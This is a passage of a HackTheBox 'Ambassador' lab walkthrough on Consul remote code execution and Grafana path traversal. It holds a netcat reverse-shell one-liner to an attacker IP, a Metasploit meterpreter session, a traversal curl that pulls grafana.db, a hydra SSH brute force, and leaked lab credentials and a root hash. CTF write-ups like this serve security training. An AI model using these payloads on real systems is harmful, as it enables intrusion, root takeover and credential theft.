 Active Internet connections (servers and established)
 Proto Recv-Q Send-Q Local Address           Foreign Address         State
 tcp        0      0 localhost:domain        0.0.0.0:*               LISTEN
 tcp        0      0 0.0.0.0:ssh             0.0.0.0:*               LISTEN
 tcp        0      0 localhost:8600          0.0.0.0:*               LISTEN
 tcp        0      0 localhost:33060         0.0.0.0:*               LISTEN
 tcp        0      0 0.0.0.0:mysql           0.0.0.0:*               LISTEN
 tcp        0      0 localhost:8300          0.0.0.0:*               LISTEN
 tcp        0      0 localhost:8301          0.0.0.0:*               LISTEN
 tcp        0      0 localhost:8302          0.0.0.0:*               LISTEN
 tcp        0      0 localhost:8500          0.0.0.0:*               LISTEN
</pre></table></code></div></div><blockquote class="prompt-info"><div><p>It exists !</p></div></blockquote><li><p>Search exploits for <code class="language-plaintext highlighter-rouge">consul</code></p><div class="table-wrapper"><table><thead><tr><th>Exploit Title<th>Path<tbody><tr><td>Hashicorp Consul - Remote Command Execution via Rexec (Metasploit)<td>linux/remote/46073.rb<tr><td>Hashicorp Consul - Remote Command Execution via Services API (Metasploit)<td>linux/remote/46074.rb</table></div><li>How does <code class="language-plaintext highlighter-rouge">Hashicorp Consul - Remote Command Execution via Rexec</code> work?<ul><li><code class="language-plaintext highlighter-rouge">consul</code> API is susceptible to a RCE exploit, attackers can construct a malicious <code class="language-plaintext highlighter-rouge">json</code> service config file for <code class="language-plaintext highlighter-rouge">consul</code> to do remote code execution.<li>More Info<ul><li><a href="https://lab.wallarm.com/consul-by-hashicorp-from-infoleak-to-rce/">Hasicorp</a><li><a href="https://lab.wallarm.com/consul-by-hashicorp-from-infoleak-to-rce/">Wallarm</a></ul></ul></ol><h2 id="port-forwarding-w-ssh-tunnel">Port Forwarding w/ SSH Tunnel <a href="#port-forwarding-w-ssh-tunnel" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>We have to be able to access consul on <code class="language-plaintext highlighter-rouge">kali</code> in order to use the metasploit exploit, we can do so w/ <code class="language-plaintext highlighter-rouge">SSH Tunnel</code><li>Port Forwarding w/ SSH tunnel<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/htb/ambassador]
 └─# sshpass -p "anEnglishManInNewYork027468" ssh -L8500:127.0.0.1:8500 developer@ambassador.htb
</pre></table></code></div></div><blockquote class="prompt-info"><div><p>On <code class="language-plaintext highlighter-rouge">kali</code> port 8500 is forwarded to <code class="language-plaintext highlighter-rouge">ambassador.htb</code> on port 8500</p></div></blockquote><li>Now we can access <code class="language-plaintext highlighter-rouge">consul</code> on kali<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/htb/ambassador]
 └─# curl localhost:8500/v1/test
 Invalid URL path: not a recognized HTTP API endpoint
</pre></table></code></div></div></ol><h2 id="root---consul-rce-metasploit">Root - Consul RCE (Metasploit) <a href="#root---consul-rce-metasploit" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Launch metasploit<li>Use for <code class="language-plaintext highlighter-rouge">multi/misc/consul_service_exec</code><li>Set <code class="language-plaintext highlighter-rouge">OPTIONS</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre> msf6 exploit(multi/misc/consul_service_exec) &gt; set ACL_TOKEN bb03b43b-1d81-d62b-24b5-39540ee469b5
 ACL_TOKEN =&gt; bb03b43b-1d81-d62b-24b5-39540ee469b5
 msf6 exploit(multi/misc/consul_service_exec) &gt; set LHOST tun0
 LHOST =&gt; 10.10.14.104
 msf6 exploit(multi/misc/consul_service_exec) &gt; set RHOSTS 127.0.0.1
 RHOSTS =&gt; 127.0.0.1
 msf6 exploit(multi/misc/consul_service_exec) &gt; set payload linux/x86/meterpreter/reverse_tcp
 payload =&gt; linux/x86/meterpreter/reverse_tcp
</pre></table></code></div></div><li>Exploit !<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre> msf6 exploit(multi/misc/consul_service_exec) &gt; exploit
	
 [*] Started reverse TCP handler on 10.10.14.104:4444
 [*] Creating service 'twNlWsVX'
 [*] Service 'twNlWsVX' successfully created.
 [*] Waiting for service 'twNlWsVX' script to trigger
 [*] Sending stage (989032 bytes) to 10.10.11.183
 [*] Meterpreter session 1 opened (10.10.14.104:4444 -&gt; 10.10.11.183:50154 ) at 2022-10-23 14:53:10 +0800
 [*] Removing service 'twNlWsVX'
 [*] Command Stager progress - 100.00% done (763/763 bytes)
	
 meterpreter &gt; shell
 Process 2932 created.
 Channel 1 created.
 id
 uid=0(root) gid=0(root) groups=0(root)
</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Ambassador/images/Pasted%20image%2020221023145738.png" alt="" data-proofer-ignore></p></ol><h1 id="additional">Additional</h1><h2 id="tcp3000-http---cve-2021-43798-grafana-800-beta1--830-arbitrary-file-read-manual">TCP/3000 (HTTP) - CVE-2021-43798, Grafana 8.0.0-beta1- 8.3.0 (Arbitrary File Read) (Manual) <a href="#tcp3000-http---cve-2021-43798-grafana-800-beta1--830-arbitrary-file-read-manual" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Following this <a href="https://vk9-sec.com/grafana-8-3-0-directory-traversal-and-arbitrary-file-read-cve-2021-43798/">blogpost</a>, we are able to leverage this vulnerability to obtain a user on the system.<ul><li><a href="https://github.com/jas502n/Grafana-CVE-2021-43798">This github repository as well</a></ul><li>Where login credentials are stored in <code class="language-plaintext highlighter-rouge">Grafana</code><ul><li><a href="https://grafana.com/docs/grafana/latest/setup-grafana/configure-grafana/#linux">Configuration File (<code class="language-plaintext highlighter-rouge">/etc/grafana/grafana.ini</code>)</a><li><a href="https://grafana.com/docs/grafana/latest/setup-grafana/configure-grafana/#security">Which part of the configuration file holds the credentials</a><li><a href="https://grafana.com/docs/grafana/latest/setup-grafana/configure-grafana/#paths">Database Configuration File (<code class="language-plaintext highlighter-rouge">/var/lib/grafana/grafana.db</code>)</a></ul><li>Read <code class="language-plaintext highlighter-rouge">/etc/grafana/grafana.ini</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre> ...SNIP...
 ############################## Security ####################################
 [security]
 # disable creation of admin user on first start of grafana
 ;disable_initial_admin_creation = false
	
 # default admin user, created on startup
 ;admin_user = admin
	
 # default admin password, can be changed before first start of grafana,  or in profile settings
 admin_password = messageInABottle685427
	
 # used for signing
 ;secret_key = SW2YcwTIb9zpOOhoPsMm
	
 ...SNIP...
</pre></table></code></div></div><blockquote class="prompt-info"><div><ul><li><code class="language-plaintext highlighter-rouge">;</code> - is a comment, meaning configuration is not active<li><code class="language-plaintext highlighter-rouge">admin:messageInABottle685427</code><li><code class="language-plaintext highlighter-rouge">SW2YcwTIb9zpOOhoPsMm</code></ul></div></blockquote><li>Tried to bruteforce SSH, failed<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/htb/ambassador/10.10.11.183/exploit]
 └─# cat usernames.txt
 root
 grafana
 developer
	
 ┌──(root💀kali)-[~/htb/ambassador/10.10.11.183/exploit]
 └─# cat passwords.txt
 messageInABottle685427
	
 ┌──(root💀kali)-[~/htb/ambassador/10.10.11.183/exploit]
 └─# hydra -L usernames.txt -P passwords.txt ssh://ambassador.htb -e nsr -I
 Hydra v9.3 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
	
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-10-22 13:41:07
 [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
 [DATA] max 12 tasks per 1 server, overall 12 tasks, 12 login tries (l:3/p:4), ~1 try per task
 [DATA] attacking ssh://ambassador.htb:22/
 1 of 1 target completed, 0 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-10-22 13:41:17
</pre></table></code></div></div><li>Successfully login w/ <code class="language-plaintext highlighter-rouge">admin:messageInABottle685427</code> <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Ambassador/images/Pasted%20image%2020221022133911.png" alt="" data-proofer-ignore><blockquote class="prompt-info"><div><p>However, <code class="language-plaintext highlighter-rouge">grafana</code> is not susceptible to any RCE exploit, lets try to obtain another set of credential by reading <code class="language-plaintext highlighter-rouge">Grafana</code> database file.</p></div></blockquote><li>Download <code class="language-plaintext highlighter-rouge">/var/lib/grafana/grafana.db</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/htb/ambassador/10.10.11.183/exploit]
 └─# curl -s "http://ambassador.htb:3000/public/plugins/jaeger/../../../../../../../../../../../../../var/lib/grafana/grafana.db" --path-as-is -o grafana.db
</pre></table></code></div></div><li>View <code class="language-plaintext highlighter-rouge">sqlite</code> database file <code class="language-plaintext highlighter-rouge">grafana.db</code> w/ <code class="language-plaintext highlighter-rouge">sqlitebrowser</code><ol class="prompt-info"><li>Download <code class="language-plaintext highlighter-rouge">sqlitebrowser</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre> sudo add-apt-repository -y ppa:linuxgndu/sqlitebrowser
 sudo apt-get update
 sudo apt-get install sqlitebrowser
</pre></table></code></div></div><li>Read <code class="language-plaintext highlighter-rouge">grafana.db</code> w/ <code class="language-plaintext highlighter-rouge">sqlitebrowser</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre> # Query
 SELECT user, password, secure_json_data FROM data_source;
</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Ambassador/images/Pasted%20image%2020221022145207.png" alt="" data-proofer-ignore></p><blockquote><p>Valid Creds</p><ul><li><code class="language-plaintext highlighter-rouge">grafana:dontStandSoCloseToMe63221!</code></ul></blockquote></ol></ol><h2 id="root---consul-rce-manual">Root - Consul RCE (Manual) <a href="#root---consul-rce-manual" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Create malicious <code class="language-plaintext highlighter-rouge">json</code> service configuration file to do RCE via <code class="language-plaintext highlighter-rouge">consul</code> API<div class="language-json highlighter-rouge"><div class="code-header"> <span data-label-text="JSON"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre><span class="w"> </span><span class="err">#</span><span class="w"> </span><span class="err">Filename:</span><span class="w"> </span><span class="err">exploit.json</span><span class="w">
 </span><span class="p">{</span><span class="w">
   </span><span class="nl">"ID"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Reverse Shell"</span><span class="p">,</span><span class="w">
   </span><span class="nl">"Name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Reverse Shell"</span><span class="p">,</span><span class="w">
   </span><span class="nl">"Address"</span><span class="p">:</span><span class="w"> </span><span class="s2">"127.0.0.1"</span><span class="p">,</span><span class="w">
   </span><span class="nl">"Port"</span><span class="p">:</span><span class="w"> </span><span class="mi">80</span><span class="p">,</span><span class="w">
   </span><span class="nl">"check"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
     </span><span class="nl">"Args"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
       </span><span class="s2">"sh"</span><span class="p">,</span><span class="w">
       </span><span class="s2">"-c"</span><span class="p">,</span><span class="w">
       </span><span class="s2">"sh /tmp/exploit.sh"</span><span class="w">
     </span><span class="p">],</span><span class="w">
     </span><span class="nl">"interval"</span><span class="p">:</span><span class="w"> </span><span class="s2">"10s"</span><span class="p">,</span><span class="w">
     </span><span class="nl">"Timeout"</span><span class="p">:</span><span class="w"> </span><span class="s2">"86400s"</span><span class="w">
   </span><span class="p">}</span><span class="w">
 </span><span class="p">}</span><span class="w">
</span></pre></table></code></div></div><li>Create payload <code class="language-plaintext highlighter-rouge">exploit.sh</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre> #!/bin/bash
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.104 4444 &gt;/tmp/f
</pre></table></code></div></div><li>Register the malicious service<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre> developer@ambassador:/tmp$ curl --header "X-Consul-Token: bb03b43b-1d81-d62b-24b5-39540ee469b5" --request PUT -T exploit.json http://127.0.0.1:8500/v1/agent/service/register
</pre></table></code></div></div><li><code class="language-plaintext highlighter-rouge">root</code> shell obtained<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/htb/photobomb]
 └─# nc -nvlp 4444
 Ncat: Version 7.92 ( https://nmap.org/ncat )
 Ncat: Listening on :::4444
 Ncat: Listening on 0.0.0.0:4444
 id
 Ncat: Connection from 10.10.11.183.
 Ncat: Connection from 10.10.11.183:58570.
 /bin/sh: 0: can't access tty; job control turned off
 # uid=0(root) gid=0(root) groups=0(root)
</pre></table></code></div></div><li><code class="language-plaintext highlighter-rouge">root</code> hash<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre> $6$AY/Hqk/PJgettbhs$mgg2hluJ8.leTpnrlEkh4RF7qE6Ns9j/TtV3Sx5OIsZ2YEA0OjGsJpmQlX2CFMmbwNjmvCZy9/Rcea4nF799V0
</pre></table></code></div></div><li>Demo - <code class="language-plaintext highlighter-rouge">consul</code> RCE (manual) <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Ambassador/images/EXrqjmnOxo.gif" alt="" data-proofer-ignore></ol><h2 id="root---configd-directory">Root - Config.d Directory <a href="#root---configd-directory" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>From <a href="https://www.youtube.com/watch?v=6M_6rapjTL0&amp;t=1220s">Ippsec</a><li>Instead of using the API to register our malicious service, write a <code class="language-plaintext highlighter-rouge">.hcl</code> configuration file that will execute our reverse shell to the <code class="language-plaintext highlighter-rouge">config.d</code> directory.<li>Proceed to <code class="language-plaintext highlighter-rouge">/etc/consul.d</code>, view files in directory<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre> developer@ambassador:/etc/consul.d$ ls -la
 total 24
 drwxr-xr-x   3 consul consul    4096 Sep 27 14:49 .
 drwxr-xr-x 103 root   root      4096 Sep 27 14:49 ..
 drwx-wx---   2 root   developer 4096 Sep 14 11:00 config.d
 -rw-r--r--   1 consul consul       0 Feb 28  2022 consul.env
 -rw-r--r--   1 consul consul    5303 Mar 14  2022 consul.hcl
 -rw-r--r--   1 consul consul     160 Mar 15  2022 README
 developer@ambassador:/etc/consul.d$
</pre></table></code></div></div><blockquote class="prompt-info"><div><p><code class="language-plaintext highlighter-rouge">drwx-wx--- 2 root developer 4096 Sep 14 11:00 config.d</code></p><ul><li>Write and Execute access for group <code class="language-plaintext highlighter-rouge">developer</code> for <code class="language-plaintext highlighter-rouge">config.d</code> directory</ul></div></blockquote><li>Create <code class="language-plaintext highlighter-rouge">exploit.hcl</code> to execute our reverse shell<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre> developer@ambassador:/etc/consul.d/config.d$ nano exploit.hcl
	
 check = {
     id = "rooted"
     args = ["/bin/bash", "/tmp/exploit.sh"],
     interval = "5s"
     }
</pre></table></code></div></div><li>Reload <code class="language-plaintext highlighter-rouge">consul</code> to apply our configuration<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre> developer@ambassador:/etc/consul.d/config.d$ consul reload --token bb03b43b-1d81-d62b-24b5-39540ee469b5
 Configuration reload triggered
</pre></table></code></div></div><li>Start listener and wait for reverse shell to execute<li>Demo - Write to <code class="language-plaintext highlighter-rouge">/etc/consul.d/config.d</code> <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Ambassador/images/UrMBaoxamu.gif" alt="" data-proofer-ignore></ol><h2 id="aesdecrypt-tool-fix">AESDecrypt Tool Fix <a href="#aesdecrypt-tool-fix" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>If secureJsonData is used we have to decrypt it in order to obtain the password for <code class="language-plaintext highlighter-rouge">sqlite</code><li>Use this <a href="https://github.com/grafana/grafana/blob/main/pkg/util/encryption.go">tool</a> to do so<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/htb/ambassador/10.10.11.183/exploit/Grafana-CVE-2021-43798]
 └─# go run AESDecrypt.go
 AESDecrypt.go:12:2: cannot find package "golang.org/x/crypto/pbkdf2" in any of:
         /usr/lib/go-1.17/src/golang.org/x/crypto/pbkdf2 (from $GOROOT)
         /root/go/src/golang.org/x/crypto/pbkdf2 (from $GOPATH)
</pre></table></code></div></div><blockquote class="prompt-info"><div><p>Failed</p></div></blockquote><li>Fix Error - <a href="https://juejin.cn/post/7148784966808109063">Source</a><ol><li>Create <code class="language-plaintext highlighter-rouge">/usr/lib/go-1.17/src/golang.org/x/</code> directory<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/htb/ambassador/10.10.11.183/exploit/Grafana-CVE-2021-43798]
 └─# mkdir -p /usr/lib/go-1.17/src/golang.org/x/
</pre></table></code></div></div><li>Proceed to <code class="language-plaintext highlighter-rouge">/usr/lib/go-1.17/src/golang.org/x/</code> and clone golang crypto repo<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[/usr/lib/go-1.17/src/golang.org/x]
 └─# git clone https://github.com/golang/crypto.git
 Cloning into 'crypto'...
</pre></table></code></div></div><li>Fixed !<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/htb/ambassador/10.10.11.183/exploit/Grafana-CVE-2021-43798]
 └─# go run AESDecrypt.go
 [*] grafanaIni_secretKey= SW2YcwTIb9zpOOhoPsMm
 [*] DataSourcePassword= R3pMVVh1UHLoUkTJOl+Z/sFymLqolUOVtxCtQL/y+Q==
 [*] plainText= jas502n
		
		
 [*] grafanaIni_secretKey= SW2YcwTIb9zpOOhoPsMm
 [*] PlainText= jas502n
 [*] EncodePassword= VTh1akR5aFf7zo3AvF2q8+8h69PdTvFtcjwBl70sjg==
</pre></table></code></div></div></ol></ol><h2 id="decrypt-securejsondata-password-w-aesdecrypt">Decrypt secureJsonData Password w/ AESDecrypt <a href="#decrypt-securejsondata-password-w-aesdecrypt" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>If <code class="language-plaintext highlighter-rouge">secureJsonData</code> is used</p><ol><li>There are a few information we need to decrypt the password<ul><li><code class="language-plaintext highlighter-rouge">grafanaIni_secretKey</code> - <code class="language-plaintext highlighter-rouge">/etc/grafana/grafana.ini</code><li><code class="language-plaintext highlighter-rouge">dataSourcePassword</code> - <code class="language-plaintext highlighter-rouge">/var/lib/grafana/grafana.db</code> - use <code class="language-plaintext highlighter-rouge">sqlitebrowser</code> to view <code class="language-plaintext highlighter-rouge">data_source</code> table, obtain <code class="language-plaintext highlighter-rouge">secure_json_data</code> column value.</ul></ol></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>HackTheBox</a>, <a href='/categories/hackthebox-linux/'>HackTheBox - Linux</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/pivot/" class="post-tag no-text-decoration" >pivot</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://www.facebook.com/sharer/sharer.php?title=HackTheBox - Ambassador - Yufong&amp;u=https://yufongg.github.io/posts/Ambassador/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="" data-toggle="tooltip" data-placement="top" title="" target="_blank" rel="noopener" aria-label=""> <i class="fa-fw "></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recent Update</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Blunder/">HackTheBox - Blunder</a><li><a href="/posts/Attacktive-Directory/">TryHackMe - Attacktive Directory</a><li><a href="/posts/Tommy-Boy-1/">Vulnhub - Tommy Boy 1</a><li><a href="/posts/Tiki-1/">Vulnhub - Tiki 1</a><li><a href="/posts/Breach-1/">Vulnhub - Breach 1</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/tcp-80-http-web-app-cms-exploit/">tcp/80-http/web-app-cms-exploit</a> <a class="post-tag" href="/tags/linux-priv-esc-linux-creds-found/">linux-priv-esc/linux-creds-found</a> <a class="post-tag" href="/tags/exploit-file-inclusion-lfi/">exploit/file-inclusion/lfi</a> <a class="post-tag" href="/tags/linux-priv-esc-sudo-gtfo-bin/">linux-priv-esc/sudo/gtfo-bin</a> <a class="post-tag" href="/tags/exploit-command-injection/">exploit/command-injection</a> <a class="post-tag" href="/tags/linux-priv-esc-kernel-exploit/">linux-priv-esc/kernel-exploit</a> <a class="post-tag" href="/tags/cryptography/">cryptography</a> <a class="post-tag" href="/tags/exploit-sqli-database-enum/">exploit/sqli/database-enum</a> <a class="post-tag" href="/tags/pivot/">pivot</a> <a class="post-tag" href="/tags/exploit-file-upload-bypass/">exploit/file-upload-bypass</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/OpenAdmin/"><div class="card-body"> <em class="timeago small" data-ts="1664121600" > 2022-09-26 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox - OpenAdmin</h3><div class="text-muted small"><p> Overview This machine begins w/ a web enumeration, discovering that on OpenNetAdmin 1.18.1 is running, it is susceptible to a RCE exploit, allowing us to obtain a low-privilege/www-data user. For...</p></div></div></a></div><div class="card"> <a href="/posts/Magic/"><div class="card-body"> <em class="timeago small" data-ts="1664208000" > 2022-09-27 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox - Magic</h3><div class="text-muted small"><p> Overview This machine begins w/ a web enumeration, discovering login.php, a login page that is susceptible to a SQLi Authentication bypass due to the lack of input sanitization. Next, we are redir...</p></div></div></a></div><div class="card"> <a href="/posts/Symfonos-2/"><div class="card-body"> <em class="timeago small" data-ts="1643904000" > 2022-02-04 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Vulnhub - Symfonos 2</h3><div class="text-muted small"><p> Recon NMAP Complete Scan # Nmap 7.92 scan initiated Sun Jan 23 22:38:50 2022 as: nmap -vv --reason -Pn -T4 